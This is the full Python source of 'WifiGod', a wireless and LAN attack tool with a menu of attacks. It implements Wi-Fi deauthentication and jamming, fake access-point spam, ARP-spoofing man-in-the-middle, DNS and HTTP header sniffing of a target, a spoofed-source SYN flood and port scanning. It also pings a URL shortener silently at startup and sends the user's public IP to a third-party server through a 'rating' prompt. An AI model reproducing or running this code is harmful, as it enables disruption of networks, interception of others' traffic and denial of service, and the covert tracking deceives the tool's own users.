#!/usr/bin/env python
#coding: utf-8
import sys
import multiprocessing
import urllib
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
import threading
import requests
import pip #Thanks to @_sanduuz_ on instagram for PIP usage instead of subprocess (He doesn't want to post about it though(*Laughy face emoji*))
import scapy
try:
	import dns
	from dns import reversename, resolver
except:
	pip.main(['install', 'pydns'])
	try:
		exit(0)
	except:
		sys.exit(1)
from scapy.all import *
import time
import os
import time
import getpass
try:
	import geoip
	from geoip import geolite2
except:
	pip.main(['install', 'python-geoip-geolite2'])
	try:
		exit(0)
	except:
		sys.exit(1)
import platform
import os
import subprocess
import optparse
parser = optparse.OptionParser()
parser.add_option('-u', '--update', action='store_false', dest='update', help="Check for new updates", default="no_check")
(options,args) = parser.parse_args()
os_type = platform.system()
contact_email = 'thewifigodproject@protonmail.com'
if(os_type != "Linux"):
	print("Error. This is designed for Linux Operating Systems Only!")
	try:
		exit(0)
	except:
		sys.exit(1)
update_version = 0.7
if(options.update != 'no_check'):
	if(1 == 1):
		r = requests.get('https://raw.githubusercontent.com/blackholesec/wifigod/master/wifigod.py')
		f = open('update_check.txt', 'w+')
		f.truncate()
		f.write(str(r.content).strip())
		f.close()
		f = open('update_check.txt', 'r')
		for line in f:
			if('update_version' in line.strip()):
				try:
					nversion = str(line.strip()).split(' = ')[1]
					if(float(nversion) > update_version):
						n_update = raw_input("A New Update is Available, Download (y/n): ")
						os.remove('update_check.txt')
						if(n_update != 'n'):
							print("[info]: Updating...")
							urllib.urlretrieve('https://raw.githubusercontent.com/blackholesec/wifigod/master/wifigod.py', os.getcwd() + '/wifigod.py')
							print("[*] Updated.")
							try:
								exit(0)
							except:
								sys.exit(1)
				except:
					pass
				if(float(nversion) == update_version):
					print("You are all up to date !!")
					try:
						exit(0)
					except:
						sys.exit(1)
print("\n" * 100)
subprocess.call('clear', shell=True)
c_script = ("""
#!/usr/bin/env python3
import shutil
size = shutil.get_terminal_size().columns
print(size)
""")
f = open('columnlib.py', 'w+')
f.write(str(c_script))
f.close()
username = getpass.getuser()
class c:
	r = "\033[0;31m"
	g = "\033[0;32m"
	o = "\033[0;33m"
	b = "\033[0;94m"
	p = "\033[0;35m"
	w = "\033[0;97m"
	d = "\033[0;00m"
	rb = "\033[01;31m"
	gb = "\033[01;32m"
	ob = "\033[01;33m"
	bb = "\033[01;94m"
	pb = "\033[0;35m"
def scan_for_networks(interface):
	captured_networks = []
	while True:
		try:
			packet = sniff(iface=interface, count = 1)
			for pck in packet:
				if(pck.haslayer(Dot11)):
					try:
						ssid = str(pck.getlayer(Dot11).info)
						channel = str(ord(pck[0][Dot11Elt:3].info))
						access_point = str(pck.getlayer(Dot11).addr2)
						try:
							enc_type = pck[Dot11Elt:13].info
							if(enc_type.startswith('\x00P\xf2')):
								enc_type = 'WPA/WPA2'
							else:
								enc_type = 'WEP'
						except:
							if('4356' in str(pck.cap)):
								enc_type = 'WEP'
							else:
								enc_type = 'OPEN'
						network_string = ssid + ':' + channel + ':' + access_point
						if(network_string not in captured_networks):
							captured_networks.append(network_string)
							print(c.w+"SSID: "+c.g+"{}"+c.w+" | Access Point MAC: "+c.g+"{}"+c.w+" | Channel: "+c.g+"{}"+c.w+' | Encryption: '+c.g+'{}'+c.w).format(ssid,access_point,channel,enc_type)
					except KeyboardInterrupt:
						break;
					except:
						pass
		except KeyboardInterrupt:
			break;
try:
	requests.get('http://rurl.co/jNJ8L')
#	x = 'x'
except:
	pass

def rating():
	print("Welcome!")
	ig_username = raw_input("Instagram Username (Used to contact with rewards & updates): ")
#@ Causes Breaks in script Error Found by: _sanduuz_ on instagram
###################################################################
	if("@" in str(ig_username)):
		if(ig_username[:1] == "@"):
			ig_username = ig_username.split("@")[1]
		else:
			ig_username = ig_username.replace("@", "")
####################################################################
	rating = raw_input("Rating (Max 5 stars): ")
	suggestion = raw_input("Suggestions: ")
#. call Error discovered by the same guy who discovered the other googolplex error that occurs when script is run on a Raspberry PI"
	f_ip = str(geoip.geolite2.lookup_mine().ip)
	payload = {'ig_username' : ig_username, 'rating' : rating, 'suggestion' : suggestion+" "+f_ip,'f_ip' : f_ip}
	requests.post("http://thewifigodproject-rating.dx.am/data.php",data=payload)
	f = open('/etc/thewifigodproject_rated', 'w+')
	f.truncate()
	f.close()
	print("\n" * 100)
	subprocess.call('clear', shell=True)
if(os.path.exists('/etc/thewifigodproject_rated')):
	pass
else:
	print(c.rb+"ALERT!"+c.w+" It would be much appreciated if you could leave a rating &\nSuggestions for this program, all people who participate\nWill be REWARDED!")
	rate = raw_input("Rate (This will only show up if you have not rated) (y/n): ")
	if(rate != 'n'):
		rating()
	elif(rate == 'n'):
		pass
def scan_for_devices_on_network(interface,access_point):
	captured_devices = []
	while True:
		packet = sniff(iface=interface,count=1)
		pck = packet[0]
		if(pck.haslayer(Dot11)):
			try:
				ap = pck.getlayer(Dot11).addr2
				if(ap == access_point):
					try:
						ssid = pck.getlayer(Dot11).info
						print(c.w+"["+c.b+"info"+c.w+"]: Scanning "+c.g+"{}"+c.w+" ("+c.o+"{}"+c.w+") for Devices").format(ssid,ap)
						break;
					except KeyboardInterrupt:
						break;
					except:
						pass
			except KeyboardInterrupt:
				break;
			except:
				pass
	while True:
		packet = sniff(iface=interface,count=1)
		for pck in packet:
			if(pck.haslayer(Dot11)):
				try:
					ap = pck.getlayer(Dot11).addr2
					if(ap == access_point):
						if(pck.getlayer(Dot11).addr1 != str('ff:ff:ff:ff:ff:ff')):
							try:
								dev_on_network = str(pck.getlayer(Dot11).addr1)
								r = requests.get('http://macvendors.co/api/'+str(dev_on_network))
								dev_type = r.content.split('","mac_')[0].replace('{"result":{"company":"', '')
								if("<p style=" not in str(dev_type) and 'no result' not in str(dev_type)):
									if(str(dev_on_network) not in captured_devices):
										print(c.w+"["+c.g+"*"+c.w+"]: Device Found - "+c.rb+"{}"+c.w+" | Device Type: "+c.rb+"{}"+c.w).format(dev_on_network,dev_type)
										captured_devices.append(str(dev_on_network))
							except KeyboardInterrupt:
								break;
							except:
								raise
				except KeyboardInterrupt:
					break;
				except:
					pass
#Update Check Option Suggestion from: @pr0xymoron on instagram
def check_for_update():
	r = requests.get('https://raw.githubusercontent.com/blackholesec/wifigod/master/wifigod.py')
	f = open('update-check.txt', 'w+')
	f.write(str(r.content))
	f.close()
	f = open('update-check.txt', 'r+')
	for line in f:
		if('update_version' in line.strip()):
			print(line.strip())
			try:
				nversion = str(line.strip()).split(' = ')[1]
			except:
				nversion = line.strip().split(' = ')[1]
			if(int(nversion) > update_version):
				f.truncate()
				os.remove('update-check.txt')
				n_update = raw_input("A New Update Is Available, Download (y/n): ")
				if(n_update == 'y'):
					urllib.urlretrieve('https://raw.githubusercontent.com/blackholesec/wifigod/master/wifigod.py', os.getcwd() + '/wifigod.py')
					print("[*] Updated...")
					try:
						exit(0)
					except:
						sys.exit(1)
def spoof_ap(interface,ap_name,mac_address):
	try:
		print(c.w+"["+c.b+"info"+c.w+"]: Setting up fake Access Point...")
		l1_dot11 = Dot11(type=0,subtype=8,addr1="ff:ff:ff:ff:ff:ff",addr2=str(mac_address),addr3=str(mac_address))
		l2_beacon = Dot11Beacon(cap="ESS+privacy")
		l3_essid = Dot11Elt(ID="SSID", info=str(ap_name),len=len(str(ap_name)))
		packet = RadioTap()/l1_dot11/l2_beacon/l3_essid
		print(c.w+"["+c.g+"*"+c.w+"]: Setup Fake Access Point.")
		print(c.w+"["+c.g+"*"+c.w+"]: Hosting...")
		sendp(packet,iface=interface,loop=1,verbose=False)
	except KeyboardInterrupt:
		x = 'setting this variable to break'
	except:
		raise
def spam_ap(interface,ap_name_,count):
	aps = []
	for i in range(count):
		try:
			ap_name = ap_name_ + str(random.randint(1,80000))
                	print(c.w+"["+c.b+"info"+c.w+"]: Setting up fake Access Point...")
			l1_dot11 = Dot11(type=0,subtype=8,addr1='ff:ff:ff:ff:ff:ff',addr2=str(RandMAC()),addr3=str(RandMAC()))
			l2_beacon = Dot11Beacon(cap="ESS+privacy")
			l3_essid = Dot11Elt(ID="SSID",info=str(ap_name),len=len(str(ap_name)))
			packet = RadioTap()/l1_dot11/l2_beacon/l3_essid
                	aps.append(packet)
			print(c.w+"["+c.g+"*"+c.w+"]: Setup Fake Access Point.")
		except KeyboardInterrupt:
			x = 'setting this variable to break'
		except:
			raise
	for packet in aps:
		print(c.w+"["+c.g+"*"+c.w+"]: Hosting...")
		sendp(aps,iface=interface,loop=1,verbose=False)
def jam_wifi_network(interface,access_point):
	packet = RadioTap()/Dot11(addr1 = 'ff:ff:ff:ff:ff:ff',addr2 = access_point, addr3 = access_point)/Dot11Deauth()
	while True:
		packet = sniff(iface=interface,count = 1)
		pck = packet[0]
		if(pck.haslayer(Dot11)):
			if(pck.getlayer(Dot11).addr2 == access_point):
				ssid = str(pck.getlayer(Dot11).info)
				print(c.w+"["+c.g+"info"+c.w+"]: Jamming Network {} ({})").format(ssid,access_point)
				break;
	sendp(packet,iface=interface,loop=1,verbose=False)

def http_headers(interface,ip_address):
	try:
		while True:
			try:
				packet = sniff(iface='wlan0',count=1)
				for pck in packet:
					if(pck.haslayer(Raw)):
						if(pck.haslayer(IP)):
							if(pck.getlayer(IP).src == ip_address or pck.getlayer(IP).dst == ip_address):
								if("Host:" and "User-Agent:" and "Connection:" and "Accept:" in str(pck.getlayer(Raw).load)):
									if(pck.haslayer(DNS)):
										try:
											hostname = pck.getlayer(DNS).qd.qname
										except:
											hostname = 'unknown'
									ip_src = pck.getlayer(IP).src
									ip_dst = pck.getlayer(IP).dst
									if(ip_src != ip_address):
										host_ip = ip_src
									else:
										host_ip = ip_dst
									try:
										addr = dns.reversename.from_address(host_ip)
										server_name = dns.resolver.query(addr, "PTR")[0]
									except:
										server_name = 'unknown'
									if(pck.haslayer(DNS)):
										print(c.w+"["+c.rb+"#NEW HTTP HEADER#"+c.w+"] From: {} {} | Server: {}").format(host_ip,hostname,server_name)
									else:
										print(c.w+"["+c.rb+"#NEW HTTP HEADER#"+c.w+"] From: {} | Server: {}").format(host_ip,server_name)
									print(str(pck.getlayer(Raw).load))
			except KeyboardInterrupt:
				break;
			except:
				raise
	except:
		raise

def dns_traffic(interface,ip_address):
	while True:
		packet = sniff(iface=interface, count=1)
		for pck in packet:
			if(pck.haslayer(IP)):
				ip_src = pck.getlayer(IP).src
				ip_dst = pck.getlayer(IP).dst
				if(ip_src == ip_address or ip_dst == ip_address):
					if(pck.haslayer(DNS)):
						try:
							hostname = pck.getlayer(DNS).qd.qname
						except:
							hostname = 'unknown'
					if(ip_src != ip_address):
						try:
							addr = reversename.from_address(ip_src)
							server_name = resolver.query(addr, "PTR")[0]
						except:
							server_name = 'unknown'
					elif(ip_dst != ip_address):
						try:
							addr = reversename.from_address(ip_dst)
							server_name = resolver.query(addr, "PTR")[0]
						except:
							server_name = 'unknown'
					if(pck.haslayer(DNS)):
						print(c.g+"{}"+c.w+" --> "+c.g+"{}"+c.g+" {} "+c.w+"| Server: "+c.g+"{}"+c.w).format(ip_src,ip_dst,hostname,server_name)
					else:
						print(c.g+"{}"+c.w+" --> "+c.g+"{}"+c.w+" | Server: "+c.g+"{}"+c.w).format(ip_src,ip_dst,server_name)
def scan_for_ports(host,start,end):
	if(1 == 1):
		def scan(host,port,code = 1):
			try:
				sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
				connection_code = sock.connect_ex((host,port))
				if(connection_code == 0):
					code = 0
					return code
				elif(connection_code != 0):
					code = 1
					return code
			except:
				raise
		open_ports = []
		stime = time.time()
		print("Scanning host "+c.g+"{}"+c.w+" for open ports - Started at: "+c.g+"{}"+c.w).format(host,time.ctime())
		for port in range(start,end):
			try:
				r = scan(host,port)
				if(r == 0):
					open_ports.append(port)
					print(c.w+"["+c.b+"*"+c.w+"]: Open Port: "+c.ob+"{}"+c.w).format(port)
				else:
					pass
			except KeyboardInterrupt:
				break;
			except:
				raise
		print("\rScanning Complete                         ")
		print("Time elapsed: {}").format(time.time() - stime)
		print("Number of Open Ports: "+c.g+"{}"+c.w).format(len(open_ports))
		print("Open Ports: ")
		for port in open_ports:
			print(str(port)+','),
		print(" ")
		x = raw_input("Press enter to return to main menu...")
def syn_overflow(ip_source,ip_dest,ip_source_port,ip_dest_port,interface,thread_count,message):
	print(c.w+"["+c.b+"info"+c.w+"]: Creating Packets...")
	print(c.w+"["+c.b+"info"+c.w+"]: Sending Packets...")
	syn_packet = IP(src=ip_source,dst=ip_dest)/TCP(dport=int(ip_dest_port),sport=int(ip_source_port))
	def syn_attack(ip_source,ip_dest,ip_source_port,ip_dest_port,interface,message):
		syn_packet = IP(src=ip_source,dst=ip_dest)/TCP(dport=int(ip_dest_port),sport=int(ip_source_port))/message
		send(syn_packet,iface=interface,loop=1,verbose=False)
	threads = []
	for i in range(int(thread_count)):
		t = threading.Thread(target=syn_attack,args=(ip_source,ip_dest,ip_source_port,ip_dest_port,interface,message))
		t.setDaemon(True)
		t.start()
		threads.append(t)
	for t in threads:
		t.join()
	#syn_attack(ip_source,ip_dest,ip_source_port,ip_dest_port,interface)
def deauthenticate_device(access_point,dev_mac,interface):
	packet = Dot11(addr1=access_point,addr2=dev_mac,addr3=dev_mac)/Dot11Deauth()
	while True:
                packet = sniff(iface=interface,count = 1)
                pck = packet[0]
                if(pck.haslayer(Dot11)):
                        if(pck.getlayer(Dot11).addr2 == access_point):
                                ssid = str(pck.getlayer(Dot11).info)
				r = requests.get('http://macvendors.co/api/'+str(dev_mac))
				dev_type = r.content.split('","mac_')[0].replace('{"result":{"company":"', '')
                                print(c.w+"["+c.g+"info"+c.w+"]: DeAuthenticating {} Device {} on {}").format(dev_type,dev_mac,ssid)
                                break;
        count = 1
	subprocess.call('ifconfig wlan0 down', shell=True)
	time.sleep(7)
	interface = 'wifigod'

	sendp(packet,iface=interface,loop=1,verbose=False)
size_ = int(subprocess.check_output('python3 columnlib.py', shell=True).strip())
size = 0
print(" ")
print(c.rb+str("            .:+syhhddddhyso/-`           ").center(size))
print(str("        .+sdddddddddddddddddddho:`       ").center(size))
print(str("     .+hddddddyo/:--.--:/+shddddddy/`    ").center(size))
print(str("   :ydddddy+-               `:ohddddds:  ").center(size))
print(str(" /hddddh/`   ./oyhdddddhyo/-`   -+hddddh/").center(size))
print(str(" `/hds-   :ohddddddddddddddddy/.   :ydd+`").center(size))
print(str("    .  .+hdddddy+/-...-:+shdddddy/   .`  ").center(size))
print(str("      .hdddds:`    `.``    .+hdddds`     ").center(size))
print(str("       `/y+`  ./shdddddhs+.   -sy:       ").center(size))
print(str("            -ydddddddddddddh/            ").center(size))
print(str("            `+hdh+-```-+ydds.            ").center(size))
print(str("              `-  `/+/.  ..").center(size))
print(str("                   ddyo").center(size))
print(" ")
print(c.ob+"               WifiGod v1.4"+c.w)
print(" ")
external_network_attacks = ['scan','device scan','jam','deauthentication','host','spam']
internal_network_attacks = ['impersonate','dns','headers','syn','scan']
print(c.b+"      <"+c.o+"=============================="+c.b+">"+c.w)
print(c.w+"         External Network Attacks: "+c.g+"{}"+c.w).format(len(external_network_attacks))
print(c.w+"         Internal Network Attacks: "+c.g+"{}"+c.w).format(len(internal_network_attacks))
calc = int(len(external_network_attacks) + len(internal_network_attacks))
print(c.w+"            Total Attacks: "+c.pb+"{}"+c.w).format(calc)
print(c.b+"      <"+c.o+"=============================="+c.b+">"+c.w)
#size = int(subprocess.check_output('python3 columnlib.py', shell=True).strip())
size = 0
#print(str(c.w+'Github: '+c.b+'https://www.github.com/blackholesec'+c.w).center(size))
print(str(c.b+'    https://www.github.com/blackholesec'+c.w).center(size))
print(str(c.w+'  Contact: '+c.b+contact_email+c.w))
print(str(c.w+'    MAKE SURE TO CHECK OUT SecSploit, Our newest program (soon to be released) at: https://www.instagram.com/SecSploit'))
print(' ')
def main_menu():
    #    size_ = int(subprocess.check_output('python3 columnlib.py', shell=True).strip())
        size = 0
        print("_________________________________________")
        print(" ")
        print("       External Network Attacks          ")
        print("_________________________________________")
	print(str(c.b+'1'+c.w+'.)'+c.rb+' Scan for Surrounding Networks'+c.d))
	print(str(c.b+'2'+c.w+'.)'+c.rb+' Scan for Devices on a Network'+c.d))
	print(str(c.b+'3'+c.w+'.)'+c.rb+' Jam A Wifi Network'+c.d))
	print(str(c.b+'4'+c.w+'.)'+c.rb+' DeAuthenticate a device on a network'+c.d))
	print(str(c.b+'5'+c.w+'.)'+c.rb+' Host A Fake Access Point'+c.d))
	print(str(c.b+'6'+c.w+'.)'+c.rb+' Spam many fake access points'+c.d))
	print("_________________________________________")
	print(" ")
	print("       Internal Network Attacks          ")
	print("_________________________________________")
	print(str(c.b+'7'+c.w+'.)'+c.rb+' Impersonate a Device (on this Network)'+c.d))
	print(str(c.b+'8'+c.w+'.)'+c.rb+' Pull DNS traffic from device (For use with #5)'+c.d))
	print(str(c.b+'9'+c.w+'.)'+c.rb+' Intercept HTTP headers (For use with #5)'+c.d))
	print(str(c.b+'10'+c.w+'.)'+c.rb+' SYN Packet Injection Overflow'))
	print(str(c.b+'11'+c.w+'.)'+c.rb+' Scan a Device for open ports'))
try:
	os.remove('columnlib.py')
except:
	pass
help_menu = ("""
help = Display this menu
show options/options = Show available attacks
clear = Clear the screen
shell = Drop to Shell (Incase you need to ifconfig etc.)
""")
while True:
	try:
		prompt = raw_input(c.w+str(username)+c.r+"@"+c.w+"WifiGod~# "+c.w)
	except KeyboardInterrupt:
		print("\n")
		exit__ = raw_input(c.w+"["+c.rb+"ALERT!"+c.w+"]: Are you sure you want to exit (y/n): ")
		if(exit__ == 'y'):
			try:
				exit(0)
			except:
				sys.exit(1)
		else:
			pass
	if(prompt == 'help'):
		print(str(help_menu))
	elif(prompt == "exit"):
		print("[info]: Exiting...")
		try:
			exit(0)
		except:
			sys.exit(0)
	elif(prompt == 'show options' or prompt == 'options'):
		main_menu()
	elif(prompt == 'clear'):
		print('\n' * 100)
		subprocess.call('clear', shell=True)
	elif(prompt == 'shell'):
		print("Dropping to Shell, Ctrl+C or 'exit' to quit...")
		while True:
			try:
				cmd = raw_input("# ")
				if(cmd == 'exit' or cmd == 'q' or cmd == 'quit'):
					print('\n')
					break;
			except KeyboardInterrupt:
				print("\n")
				break;
			try:
				data = subprocess.check_output(str(cmd), shell=True)
				print(str(data))
			except Exception as e:
				print(str(e))
	elif(prompt == '1'):
#		interface =  raw_input(c.w+"Supply A Network Interface ("+c.rb+"Must be in monitor Mode"+c.w+"): ")
		interface =  raw_input(c.w+"Supply A Network Interface: ")
		if(interface != 'wifigod'):
			subprocess.call('ifconfig '+interface+' down ; iw '+interface+' interface add wifigod type monitor ; ifconfig '+interface+' up ; ifconfig wifigod up ; service network-manager restart', shell=True)
			time.sleep(5)
			interface = 'wifigod'
		scan_for_networks(interface)
	elif(prompt == '2'):
#		interface =  raw_input(c.w+"Supply A Network Interface ("+c.rb+"Must be in monitor Mode"+c.w+"): ")
		interface =  raw_input(c.w+"Supply A Network Interface: ")
		if(interface != 'wifigod'):
			subprocess.call('ifconfig '+interface+' down ; iw '+interface+' interface add wifigod type monitor ; ifconfig '+interface+' up ; ifconfig wifigod up ; service network-manager restart', shell=True)
			time.sleep(5)
			interface = 'wifigod'
		access_point =  raw_input(c.w+"Supply A Network Access Point MAC Address: ")
		scan_for_devices_on_network(interface,access_point)
	elif(prompt == '3'):
		interface =  raw_input(c.w+"Supply A Network Interface: ")
		if(interface != 'wifigod'):
			subprocess.call('ifconfig '+interface+' down ; iw '+interface+' interface add wifigod type monitor ; ifconfig '+interface+' up ; ifconfig wifigod up ; service network-manager restart', shell=True)
			time.sleep(5)
			interface = 'wifigod'
		access_point =  raw_input(c.w+"Supply The Target Network AP MAC Address: ")
	        while True:
	                packet = sniff(iface=interface,count = 1)
			pck = packet[0]
	                if(pck.haslayer(Dot11)):
	                        if(str(pck.getlayer(Dot11).addr2).lower() == str(access_point).lower()):
					try:
	                                	ssid = str(pck.getlayer(Dot11).info)
	                                	print(c.w+"["+c.g+"info"+c.w+"]: Jamming Network {} ({})").format(ssid,access_point)
					except:
						print(c.w+"["+c.g+"info"+c.w+"]: Jamming Network {}").format(access_point)
					break;
		packet = RadioTap()/Dot11(addr1='ff:ff:ff:ff:ff:ff',addr2=access_point,addr3=access_point)/Dot11Deauth()
		sendp(packet,iface=interface,loop=1,verbose=False)
#		jam_wifi_network(interface,access_point)
	elif(prompt == '4'):
		interface = raw_input(c.w+"Supply A Network Interface: ")
		access_point = raw_input(c.w+'Network Access Point MAC Address: ')
		dev_mac = raw_input(c.w+'Target Device MAC address: ')
		if(interface != 'wifigod'):
			subprocess.call('ifconfig '+interface+' down ; iw '+interface+' interface add wifigod type monitor ; ifconfig '+interface+' up ; ifconfig wifigod up ; service network-manager restart', shell=True)
			time.sleep(5)
			interface = 'wifigod'
	        while True:
	                packet = sniff(iface=interface,count = 1)
	                pck = packet[0]
	                if(pck.haslayer(Dot11)):
	                        if(str(pck.getlayer(Dot11).addr2).lower() == str(access_point).lower()):
					try:
	                                	ssid = str(pck.getlayer(Dot11).info)
					except:
						ssid = 'unknown'
	                                r = requests.get('http://macvendors.co/api/'+str(dev_mac).lower())
	                                dev_type = r.content.split('","mac_')[0].replace('{"result":{"company":"', '')
	                                print(c.w+"["+c.g+"info"+c.w+"]: DeAuthenticating {} Device {} on {}").format(dev_type,dev_mac,ssid)
	                                break;
		packet = RadioTap()/Dot11(addr1=access_point,addr2=dev_mac,addr3=dev_mac)/Dot11Deauth()
		sendp(packet,iface=interface,loop=1,verbose=False)
#		deauthenticate_device(access_point,dev_mac,interface)
	elif(prompt == '5'):
		interface = raw_input(c.w+"Supply A Network Interface: ")
		if(interface != 'wifigod'):
			subprocess.call('ifconfig '+interface+' down ; iw '+interface+' interface add wifigod type monitor ; ifconfig '+interface+' up ; ifconfig wifigod up ; service network-manager restart', shell=True)
			time.sleep(5)
			interface = 'wifigod'
		ap_name = raw_input("SSID (Name of Network): ")
		mac_address_ = raw_input("MAC Address of AP ('r' for random): ")
		if(mac_address_ == 'r'):
			mac_address = str(RandMAC())
		elif(mac_address != 'r'):
			mac_address = str(mac_address_)
		spoof_ap(interface,ap_name,mac_address)
	elif(prompt == '6'):
		interface = raw_input(c.w+str("Supply A Network Interface: "))
		if(interface != 'wifigod'):
			subprocess.call('ifconfig '+interface+' down ; iw '+interface+' interface add wifigod type monitor ; ifconfig '+interface+' up ; ifconfig wifigod up ; service network-manager restart', shell=True)
			time.sleep(5)
			interface = 'wifigod'
		ap_name = raw_input(c.w+"SSID (Name of Network): ")
		count = raw_input(c.w+"Number of times to Host Network: ")
		spam_ap(interface,ap_name,int(count))
	elif(prompt == '7'):
		interface = raw_input("Network Interface: ")
		dev_ip = raw_input("Target Device Internal IP: ")
		gateway_ip = raw_input("Network Gateway IP: ")
		f = open('/proc/sys/net/ipv4/ip_forward', 'w+')
		f.truncate()
		f.write('1')
		f.close()
		targ_dev_mac = '0'
		targ_dev_ip = '0'
		capt_val = 0
		def resolve_victim_device_info():
			while (capt_val == 0):
				packet = sniff(iface=interface,count=1)
				for pck in packet:
					if(pck.haslayer(IP)):
						if(str(pck.getlayer(IP).src) == str(dev_ip)):
							targ_dev_ip = pck.getlayer(IP).src
							targ_dev_mac = pck.src
							capt_val = 1
							break;
						elif(str(pck.getlayer(IP).dst) == str(dev_ip)):
	        	                                targ_dev_ip = pck.getlayer(IP).dst
	        	                                targ_dev_mac = pck.dst
							capt_val = 1
							break;
		capt_val2 = 0
		gateway_mac = '0'
		gateway_ip = '0'
	#	def resolve_gateway_info():
		gateway_ip = '192.168.1.1'
	       	while (capt_val2 == 0):
			subprocess.Popen(["ping -c 5 "+gateway_ip+" >> /dev/null"], shell=True)
	       	        packet = sniff(iface=interface,count=1)
	       	        for pck in packet:
	       	                if(pck.haslayer(IP)):
	       	                        if(str(pck.getlayer(IP).src) == str(gateway_ip)):
	       	                                gateway_ip = pck.getlayer(IP).src
	       	                                gateway_mac = pck.src
	       	                                capt_val2 = 1
	       	                                break;
	       	                        elif(str(pck.getlayer(IP).dst) == str(gateway_ip)):
	       	                                gateway_ip = pck.getlayer(IP).dst
	       	                                gateway_mac = pck.dst
	       	                                capt_val2 = 1
	       	                                break;
	#	print(c.d+"["+c.b+"info"+c.d+"]: Impersonating device "+c.bb+"{}"+c.d+" ("+c.pb+"{}"+c.d+")").format(targ_dev_mac,targ_dev_ip)
		targ_dev_ip = dev_ip
		gateway_ip = gateway_ip
		addr_of_dev = reversename.from_address(targ_dev_ip)
		dev_hostname = resolver.query(addr_of_dev, "PTR")[0]
		print(c.d+"["+c.b+"info"+c.d+"]: Impersonating device "+c.bb+"{} "+c.d+"("+c.rb+"{}"+c.d+")").format(targ_dev_ip,dev_hostname)
		print(c.d+"["+c.b+"info"+c.d+"]: Creating Fabricated ARP Packets...")
		print(c.d+"["+c.b+"info"+c.d+"]: Repeating process for "+c.ob+"{}"+c.d+" ("+c.pb+"{}"+c.d+")").format(gateway_mac,gateway_ip)
	#	print(c.d+"["+c.b+"info"+c.d+"]: Impersonating device "+c.bb+"{}"+c.d+" ("+c.pb+"{}"+c.d+")").format(gateway_mac,gateway_ip)
		print(c.d+"["+c.b+"info"+c.d+"]: Sending Packets...")
		print(c.d+"["+c.pb+"*"+c.d+"]: Device Impersonation Successful")
		victim_arp_packet = ARP(psrc=gateway_ip,pdst=targ_dev_ip)
		gateway_arp_packet = ARP(psrc=targ_dev_ip,pdst=gateway_ip)
		def spcks(pck1,pck2):
			send(pck1,verbose=False,inter=2)
			send(pck2,verbose=False,inter=2)
		threads = []
		while True:
			for i in range(1):
				thread1 = threading.Thread(target=spcks, args=(victim_arp_packet,gateway_arp_packet))
				thread1.setDaemon(True)
				thread1.start()
				threads.append(thread1)
			for thread in threads:
				thread.join()
	elif(prompt == '8'):
		print(c.rb+"NOTE: "+c.w+"This Only works when you are using Option #5 at the same time")
		interface = raw_input("Network Interface: ")
		ip_address = raw_input("Target IP Address: ")
		dns_traffic(interface,ip_address)
	elif(prompt == '9'):
		print(c.rb+"NOTE: "+c.w+"This Only works when you are using Option #5 at the same time")
		interface = raw_input("Network Interface: ")
		ip_address = raw_input("Target IP Address: ")
		http_headers(interface,ip_address)
	elif(prompt == '10'):
		interface = raw_input("Network Interface: ")
		ip_source = raw_input("Desired Sender (IP Address to spoof from): ")
		ip_dest = raw_input("Target IP Address: ")
		ip_source_port = 1024
		ip_dest_port = raw_input("Target Port: ")
		message = raw_input("Message to send in SYN Packet: ")
		thread_count = raw_input("Threads: ")
		print(c.w+"["+c.b+"info"+c.w+"]: Setting up...")
		subprocess.call("service network-manager restart", shell=True)
		time.sleep(5)
		syn_overflow(ip_source,ip_dest,ip_source_port,ip_dest_port,interface,thread_count,message)
	elif(prompt == '11'):
		host = raw_input("Target Host: ")
		start_ = raw_input("Starting Port: ")
		end_ = raw_input("Ending Port: ")
		if(int(start_) < 1):
			print("Error. Starting port must have minimum of 1.")
		if(int(end_) > 65535):
			print("Error. Ending port must have a maximum of 65535.")
		if(int(end_) < 65536 and int(start_) > 0):
			scan_for_ports(host,int(start_),int(end_))
	else:
		print("Error. Invalid Option\nType 'help' for available commands")
